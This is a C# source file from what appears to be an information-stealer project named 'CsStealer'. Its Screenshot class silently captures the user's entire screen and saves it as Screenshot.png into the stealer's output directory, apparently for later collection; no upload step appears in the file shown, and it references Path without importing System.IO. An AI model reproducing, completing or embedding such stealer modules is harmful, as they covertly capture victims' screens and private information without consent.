using System;
using System.Drawing;

namespace CsStealer
{
    class Screenshot
    {
        public static void GetScreenshot()
        {
            int screenWidth = GetSystemMetrics(0);
            int screenHeight = GetSystemMetrics(1);

            using (Bitmap bitmap = new Bitmap(screenWidth, screenHeight))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(0, 0, 0, 0, new Size(screenWidth, screenHeight));
                }
                bitmap.Save(Path.Combine(Config.OutputDir, "Screenshot.png"), System.Drawing.Imaging.ImageFormat.Png);
            }
        }

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);
    }
}